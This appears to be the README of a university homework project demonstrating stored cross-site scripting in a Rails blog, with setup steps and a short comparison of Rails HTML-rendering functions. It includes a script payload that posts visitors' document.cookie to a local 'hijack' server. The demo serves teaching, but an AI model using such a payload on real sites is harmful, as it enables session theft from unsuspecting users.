# XSS-Demo
ICCS474 Cross-site Scripting Demo Homework

## Installing the project

* After cloning this repo, run `bundle install` in the terminal.
* Open new terminal tab and `cd` to `xss-server` then run `npm install`.
* In `xss-server` directory, run `node server.js`
* In project root directory, run `rails server`

## XSS-Example

When you sign in to the website, create a blog with some content and adding the code below.

```
<script>
	$.post("http://localhost:5000/hijack", {user_cookie: document.cookie});
</script>
```

After this, the other users that viewing the blog created by you will get their cookies
send to the node server. You can view all the cookies in the terminal that run `nodejs server`.

## Safest render function?

Using `sanitize` function to render html is the safest way comparing to `raw`, `<%== %>`, and `.html_safe`. The reason is
because `sanitize` function will remove all tags and attributes of `HTML` that are unsafe. However, using `sanitize`
function for sanitizing input string from the user does not guarantee that the result of rendered `HTML` will be in the
right format. The output can contain unescaped characters such as `<`, `>`, or `&`.
